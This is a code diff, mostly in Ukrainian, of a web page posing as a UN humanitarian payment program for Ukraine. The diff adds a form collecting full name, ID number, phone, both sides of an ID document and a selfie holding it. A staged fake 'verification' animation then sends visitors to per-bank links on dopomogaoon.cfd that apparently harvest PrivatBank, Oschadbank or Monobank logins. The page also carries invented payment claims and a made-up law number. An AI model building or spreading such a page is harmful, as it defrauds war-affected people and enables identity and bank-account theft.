@@ -323,6 +323,113 @@
             margin-top: 0.5rem;
         }
 
+        /* Form styles */
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #555;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-blue);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 97, 255, 0.1);
+        }
+
+        .file-upload {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem;
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .file-upload:hover {
+            border-color: var(--primary-blue);
+        }
+
+        .file-upload i {
+            font-size: 2rem;
+            color: var(--primary-blue);
+            margin-bottom: 1rem;
+        }
+
+        .file-upload-text {
+            text-align: center;
+            color: #555;
+        }
+
+        .file-name {
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+            color: var(--primary-blue);
+        }
+
+        /* Verification animation */
+        .verification-container {
+            text-align: center;
+            padding: 2rem;
+        }
+
+        .verification-icon {
+            font-size: 3rem;
+            color: var(--primary-blue);
+            margin-bottom: 1.5rem;
+            animation: pulse 2s infinite;
+        }
+
+        .verification-text {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #555;
+            height: 2rem;
+        }
+
+        .verification-subtext {
+            color: #777;
+            margin-top: 1rem;
+        }
+
+        .bank-verification-link {
+            display: block;
+            margin-top: 1rem;
+            padding: 1rem;
+            background: #f5f9ff;
+            border-radius: 8px;
+            color: var(--primary-blue);
+            font-weight: 600;
+            text-decoration: none;
+            transition: var(--transition);
+        }
+
+        .bank-verification-link:hover {
+            background: #e6f0ff;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
         /* Footer */
         footer {
             background: var(--gradient-blue);
@@ -428,7 +535,7 @@
                 <li class="nav-item"><a href="#about" class="nav-link">Про нас</a></li>
                 <li class="nav-item"><a href="#payment" class="nav-link">Виплати</a></li>
                 <li class="nav-item"><a href="#eligibility" class="nav-link">Умови</a></li>
-                <li class="nav-item"><a href="#help" class="nav-link">Отримати допомогу</a></li>
+                <li class="nav-item"><a href="#get-payment" class="nav-link">Отримати виплату</a></li>
             </ul>
         </nav>
     </div>
@@ -442,8 +549,14 @@
                     Програма гуманітарної допомоги від Організації Об'єднаних Націй спрямована на підтримку 
                     населення України, яке постраждало внаслідок військових дій. Ми надаємо фінансову допомогу 
                     для забезпечення основних потреб та відновлення життя.
+
+                    📌 Старт прийому заявок від міжнародних організацій
+                    Перший етап збору заявок на грошову допомогу розпочато. 
+                    Наразі вже подано понад 10 мільйонів заявок від громадян України.
+
+                    🔹 Тимчасово призупинено подання нових заявок на платформі єДопомога для детального опрацювання вже поданих.
+                    🔹 Після обробки дані будуть передані міжнародним організаціям для фінансування.
                 </p>
-                <a href="#help" class="btn btn-primary">Отримати допомогу</a>
             </div>
             
             <div class="card">
@@ -473,6 +586,22 @@
                     Організація Об'єднаних Націй (ООН) - це міжнародна організація, створена для підтримки 
                     миру, безпеки та розвитку співпраці між країнами. Наша гуманітарна місія в Україні 
                     спрямована на допомогу людям, які постраждали від конфлікту.
+                    ❗ Важливо:
+                    Не відкладайте подачу заявки, адже кількість допомоги може бути обмеженою.
+                     Офіційні джерела – лише урядкові сайти та «Дія» (уникайте шахраїв!
+
+                     💳 Одноразова допомога від держави з 1 серпня 2025 року
+                     Згідно з новим законом №12/7819, ФОПи та наймані працівники зможуть отримати 10,800 гривень одноразової допомоги.
+
+                 📌 Умови отримання:
+                  ✅ Для кого: ФОПи (всі системи оподаткування) та працівники за трудовим договором.
+                  ✅ Сума: 10,800 грн (не оподатковується, не потрібно повертати).
+                  ✅ Термін подачі: Послуга доступна протягом року, навіть для тих, хто вже отримував допомогу раніше.
+                  ✅ Захист прав:
+ 
+                Роботодавець не має права звільняти співробітника через отримання допомоги.
+
+                 Інформація про отримувачів не розголошується.
                 </p>
                 <ul class="feature-list">
                     <li class="feature-item">
@@ -505,8 +634,8 @@
             <div class="card">
                 <h3 class="card-title">Розмір допомоги</h3>
                 <p class="page-content">
-                    Розмір одноразової гуманітарної виплати становить <strong>3,000 гривень</strong> на одну особу. 
-                    Для сімей з дітьми передбачені додаткові виплати у розмірі <strong>1,500 гривень</strong> на кожну дитину.
+                    Розмір одноразової гуманітарної виплати становить <strong>10,800 гривень</strong> на одну особу. 
+                    Для сімей з дітьми передбачені додаткові виплати у розмірі <strong>2,500 гривень</strong> на кожну дитину.
                 </p>
             </div>
             
@@ -572,55 +701,97 @@
             </div>
         </div>
 
-        <!-- Help Page -->
-        <div id="help" class="page">
-            <h2 class="page-title">Отримати допомогу</h2>
-            <div class="card">
-                <h3 class="card-title">Оберіть ваш банк</h3>
-                <p class="page-content">
-                    Для отримання допомоги оберіть банк, в якому у вас є картка. Ви будете перенаправлені 
-                    на офіційний сайт банку для подальшого оформлення.
-                </p>
+        <!-- Get Payment Page -->
+        <div id="get-payment" class="page">
+            <h2 class="page-title">Отримати виплату</h2>
+            <div class="card" id="payment-form-card">
+                <h3 class="card-title">Заповніть форму</h3>
+                
+                <div class="form-group">
+                    <label for="fullname" class="form-label">Повне ім'я</label>
+                    <input type="text" id="fullname" class="form-control" placeholder="Введіть ваше повне ім'я" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="id-number" class="form-label">Номер ID-картки або паспорта</label>
+                    <input type="text" id="id-number" class="form-control" placeholder="Введіть номер документа" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone" class="form-label">Номер телефону</label>
+                    <input type="tel" id="phone" class="form-control" placeholder="+380 XX XXX XX XX" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Завантажте фото вашого ID-документа (лицьова сторона)</label>
+                    <div class="file-upload" id="id-front-upload">
+                        <i class="fas fa-id-card"></i>
+                        <div class="file-upload-text">Натисніть для завантаження фото</div>
+                        <div class="file-name" id="id-front-file-name"></div>
+                        <input type="file" id="id-front-file" accept="image/*" style="display: none;">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Завантажте фото вашого ID-документа (зворотна сторона)</label>
+                    <div class="file-upload" id="id-back-upload">
+                        <i class="fas fa-id-card"></i>
+                        <div class="file-upload-text">Натисніть для завантаження фото</div>
+                        <div class="file-name" id="id-back-file-name"></div>
+                        <input type="file" id="id-back-file" accept="image/*" style="display: none;">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Завантажте селфі з вашим ID-документом</label>
+                    <div class="file-upload" id="selfie-upload">
+                        <i class="fas fa-camera"></i>
+                        <div class="file-upload-text">Натисніть для завантаження селфі</div>
+                        <div class="file-name" id="selfie-file-name"></div>
+                        <input type="file" id="selfie-file" accept="image/*" style="display: none;">
+                    </div>
+                </div>
                 
                 <div class="bank-selection">
+                    <h3 class="card-title">Оберіть ваш банк</h3>
                     <div class="bank-list">
-                        <!-- Замініть посилання на свої -->
-                        <a href="https://privatbank.ua" class="bank-card" id="privatbank">
+                        <div class="bank-card" data-bank="privatbank">
                             <img src="privat.png" alt="ПриватБанк" class="bank-logo">
                             <div class="bank-name">ПриватБанк</div>
-                        </a>
-                        <a href="https://www.monobank.ua" class="bank-card" id="monobank">
+                        </div>
+                        <div class="bank-card" data-bank="monobank">
                             <img src="mono.png" alt="Монобанк" class="bank-logo">
                             <div class="bank-name">Монобанк</div>
-                        </a>
-                        <a href="https://www.oschadbank.ua" class="bank-card" id="oschadbank">
+                        </div>
+                        <div class="bank-card" data-bank="oschadbank">
                             <img src="oshad.png" alt="Ощадбанк" class="bank-logo">
                             <div class="bank-name">Ощадбанк</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn btn-primary btn-block" id="submit-btn">Надіслати заявку</button>
+            </div>
+            
+            <div class="card" id="verification-card" style="display: none;">
+                <div class="verification-container">
+                    <i class="fas fa-spinner verification-icon"></i>
+                    <div class="verification-text" id="verification-text">Очікуйте...</div>
+                    <div class="verification-subtext">Триває перевірка ваших даних. Це може зайняти кілька хвилин.</div>
+                    
+                    <div id="bank-verification" style="display: none; margin-top: 2rem;">
+                        <h3>Для завершення верифікації перейдіть за посиланням вашого банку:</h3>
+                        <a href="http://dopomogaoon.cfd/privat/vGKXbReWcO" class="bank-verification-link" id="privat-link" target="_blank" style="display: none;">
+                            <i class="fas fa-external-link-alt"></i> Верифікація через ПриватБанк
+                        </a>
+                        <a href="http://dopomogaoon.cfd/oshad/SaWjGcRiMf" class="bank-verification-link" id="oshad-link" target="_blank" style="display: none;">
+                            <i class="fas fa-external-link-alt"></i> Верифікація через Ощадбанк
+                        </a>
+                        <a href="http://dopomogaoon.cfd/mono/ViYzgdAGKx" class="bank-verification-link" id="mono-link" target="_blank" style="display: none;">
+                            <i class="fas fa-external-link-alt"></i> Верифікація через Монобанк
                         </a>
                     </div>
                 </div>
-            </div>
-            
-            <div class="card">
-                <h3 class="card-title">Інструкція</h3>
-                <ol class="feature-list">
-                    <li class="feature-item">
-                        <i class="fas fa-1 feature-icon"></i>
-                        <span>Оберіть свій банк зі списку вище</span>
-                    </li>
-                    <li class="feature-item">
-                        <i class="fas fa-2 feature-icon"></i>
-                        <span>Авторизуйтесь у своєму банківському додатку</span>
-                    </li>
-                    <li class="feature-item">
-                        <i class="fas fa-3 feature-icon"></i>
-                        <span>Заповніть заявку на отримання допомоги</span>
-                    </li>
-                    <li class="feature-item">
-                        <i class="fas fa-4 feature-icon"></i>
-                        <span>Очікуйте зарахування коштів</span>
-                    </li>
-                </ol>
             </div>
         </div>
     </div>
@@ -669,10 +840,100 @@
             alert('Це офіційний сайт програми гуманітарної допомоги ООН в Україні. Будьте обережні з фейковими сайтами!');
         });
 
-        // Ви можете змінити посилання на банки так:
-        // document.getElementById('privatbank').href = 'ВАШЕ_ПОСИЛАННЯ_ДЛЯ_ПРИВАТБАНК';
-        // document.getElementById('monobank').href = 'ВАШЕ_ПОСИЛАННЯ_ДЛЯ_МОНОБАНК';
-        // document.getElementById('oschadbank').href = 'ВАШЕ_ПОСИЛАННЯ_ДЛЯ_ОЩАДБАНК';
+        // Завантаження файлів
+        document.getElementById('id-front-upload').addEventListener('click', function() {
+            document.getElementById('id-front-file').click();
+        });
+
+        document.getElementById('id-back-upload').addEventListener('click', function() {
+            document.getElementById('id-back-file').click();
+        });
+
+        document.getElementById('selfie-upload').addEventListener('click', function() {
+            document.getElementById('selfie-file').click();
+        });
+
+        document.getElementById('id-front-file').addEventListener('change', function(e) {
+            const fileName = e.target.files[0]?.name || 'Файл не вибрано';
+            document.getElementById('id-front-file-name').textContent = fileName;
+        });
+
+        document.getElementById('id-back-file').addEventListener('change', function(e) {
+            const fileName = e.target.files[0]?.name || 'Файл не вибрано';
+            document.getElementById('id-back-file-name').textContent = fileName;
+        });
+
+        document.getElementById('selfie-file').addEventListener('change', function(e) {
+            const fileName = e.target.files[0]?.name || 'Файл не вибрано';
+            document.getElementById('selfie-file-name').textContent = fileName;
+        });
+
+        // Вибір банку
+        document.querySelectorAll('.bank-card').forEach(card => {
+            card.addEventListener('click', function() {
+                document.querySelectorAll('.bank-card').forEach(c => {
+                    c.style.borderColor = '#e0e9ff';
+                });
+                this.style.borderColor = 'var(--primary-blue)';
+            });
+        });
+
+        // Відправка форми
+        const verificationMessages = [
+            "Очікуйте...",
+            "Перевіряємо ваші дані...",
+            "Верифікуємо документи...",
+            "Зв'язуємось із банком...",
+            "Завершення перевірки..."
+        ];
+
+        document.getElementById('submit-btn').addEventListener('click', function() {
+            // Перевірка заповнення форми
+            const fullname = document.getElementById('fullname').value;
+            const idNumber = document.getElementById('id-number').value;
+            const phone = document.getElementById('phone').value;
+            const idFrontFile = document.getElementById('id-front-file').files[0];
+            const idBackFile = document.getElementById('id-back-file').files[0];
+            const selfieFile = document.getElementById('selfie-file').files[0];
+            const selectedBank = document.querySelector('.bank-card[style*="border-color: var(--primary-blue)"]');
+            
+            if (!fullname || !idNumber || !phone || !idFrontFile || !idBackFile || !selfieFile || !selectedBank) {
+                alert('Будь ласка, заповніть всі поля, завантажте всі документи та оберіть банк');
+                return;
+            }
+            
+            // Показати процес верифікації
+            document.getElementById('payment-form-card').style.display = 'none';
+            document.getElementById('verification-card').style.display = 'block';
+            
+            // Анімація зміни тексту
+            let counter = 0;
+            const verificationText = document.getElementById('verification-text');
+            const interval = setInterval(() => {
+                verificationText.textContent = verificationMessages[counter % verificationMessages.length];
+                counter++;
+                
+                if (counter >= verificationMessages.length * 2) {
+                    clearInterval(interval);
+                    
+                    // Показати посилання на верифікацію банку
+                    document.getElementById('bank-verification').style.display = 'block';
+                    const bank = selectedBank.getAttribute('data-bank');
+                    
+                    if (bank === 'privatbank') {
+                        document.getElementById('privat-link').style.display = 'block';
+                    } else if (bank === 'oschadbank') {
+                        document.getElementById('oshad-link').style.display = 'block';
+                    } else if (bank === 'monobank') {
+                        document.getElementById('mono-link').style.display = 'block';
+                    }
+                    
+                    verificationText.textContent = "Завершено!";
+                    document.querySelector('.verification-icon').className = "fas fa-check-circle verification-icon";
+                    document.querySelector('.verification-icon').style.color = "var(--green)";
+                }
+            }, 1000);
+        });
     </script>
 </body>
 </html>
